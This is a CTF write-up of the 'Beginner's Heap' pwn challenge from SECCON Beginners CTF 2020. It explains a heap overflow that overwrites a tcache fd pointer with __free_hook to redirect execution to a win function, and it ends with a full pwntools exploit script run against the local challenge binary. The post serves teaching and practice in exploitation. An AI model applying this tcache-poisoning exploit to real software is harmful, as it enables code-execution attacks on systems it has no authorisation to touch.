---
title: "Beginner's Heap - SECCON Beginner's CTF 2020"
date: 2022-05-06T09:14:45+09:00
tags: ["pwn", "SECCON Beginners CTF", "ptr-yudai's chall"]
draft: false
---

# Plan
Overwrite under chunk's `fd` pointer by Heap Overflow, and then call `win` function by tcache poisoning.

# Preparation
Malloced and then, it connects area freed of B to `tcache`.

```
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x000055dfd3002350(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

# Vulnerability
Vulnerability is Heap Overflow.
You can write 0x80 byte to a chunk for 0x18.

## Overwrite B's `fd` pointer
Now, there isn't a freed chunk which connects to the next 
because the freed chunk's `fd` is `NULL`.

Here, overwrite the B's `fd` by using Heap Overflow of A and then, 
`tcache` think there will be a next the B.

The figure of gave `A*24 + 0x31 + __freehook` to the area.

[![Image from Gyazo](https://i.gyazo.com/3b549b3e5a42c8e50762308c481089cf.png)](https://gyazo.com/3b549b3e5a42c8e50762308c481089cf)


## Overwrite the `fd` with `__free_hook`
Overwrite the `fd` with `__free_hook` and then, `tcache` is the following.

`0x00007effac9cc8e8` is address of `__free_hook`.
```
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x0000557af97c3350(rw-) ]
        ||
        \/
[ 0x00007effac9cc8e8(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

## Overwrite the chunk size with `0x30`
When a times of malloc is restricted, if it keep the chunk size is `0x20`, 
the address of `__free_hook` is NOT returned.

Therefore, change to `0x30` and then, 
the `__free_hook` is came to head of `tcache` 
because freed chunk of B connects to `tcache` for 0x30.

When `B` and `__free_hook` connects to `tcache` for 0x20
```
tcache [0x20] -> B -> __free_hook
tcache [0x30] -> NULL
```

After changing the chunk size of B, and then malloced and freed.
```
tcache [0x20] -> __free_hook
tcache [0x30] -> B
```

## Write the `win` function to `__free_hook`
Address returned with `B = malloc(0x18)` is `__free_hook`.
`__free_hook` is a hook[^1] called when execute `free` function.
Therefore, write the address of `win` function to `__free_hook` and then `free()`,
`win` function will be called.

[^1]: imagine of hook is the place via once.

> Please follow the my [Twitter](https://twitter.com/yu1hpa).

# [Solver](https://github.com/yu1hpa/ctf-writeup/blob/master/2020/SECCONBiginnersCTF/BeginnersHeap/solve.py)

```python
from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

def write(data):
    io.sendlineafter("> ", "1")
    io.sendline(data)

def malloc(data):
    io.sendlineafter("> ", "2")
    io.sendline(data)

def free():
    io.sendlineafter("> ", "3")

def describe_heap():
    io.sendlineafter("> ", "4")

io = process("./chall")

#leak address
io.recvuntil("<__free_hook>: ")
addr_free_hook = int(io.recvline(), 16)
print("__free_hook address: " + hex(addr_free_hook))

io.recvuntil("<win>: ")
addr_win = int(io.recvline(), 16)
print("win address: " + hex(addr_win))

payload = b"A"*0x18
payload += p64(0x31)
payload += p64(addr_free_hook)

malloc("")
free()
write(payload)

malloc("")
free()

malloc(p64(addr_win))
free()

io.interactive()
```
